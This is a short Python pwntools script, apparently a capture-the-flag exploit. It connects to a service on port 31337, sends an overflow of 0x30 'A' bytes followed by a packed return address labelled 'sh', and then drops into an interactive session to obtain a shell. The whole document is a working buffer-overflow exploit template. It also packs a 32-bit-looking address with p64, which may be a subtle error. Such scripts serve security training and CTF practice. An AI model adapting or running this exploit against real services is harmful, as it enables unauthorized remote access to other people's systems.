from pwn import *

HOST, PORT = '0.0.0.0', 31337
r = remote(HOST, PORT)

sh=0x804867b
r.sendline(b'A'*0x30 + p64(sh))

r.interactive()